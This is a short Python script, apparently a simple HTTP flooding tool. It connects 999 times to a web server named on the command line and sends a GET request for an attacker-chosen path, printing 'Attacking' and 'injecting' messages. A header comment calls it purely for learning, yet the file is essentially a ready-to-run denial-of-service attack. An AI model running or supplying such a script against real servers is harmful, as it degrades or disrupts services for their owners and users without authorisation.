# Please note that running this code might
# cause your IP to be blocked by the server. The purpose
# of this code is purely for learning purposes.
import socket
import sys
import os

print("][ Attacking " + sys.argv[1] + " ... ][")
print("injecting " + sys.argv[2])

def attack():
	#pid = os.fork() 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 80))
	print(">> GET /" + sys.argv[2] + " HTTP/1.1")
	s.send(("GET /" + sys.argv[2] + " HTTP/1.1\r\n").encode())
	s.send(("Host: " + sys.argv[1] + "\r\n\r\n").encode())
	s.close()

# Driver code
for i in range(1, 1000):
	attack()
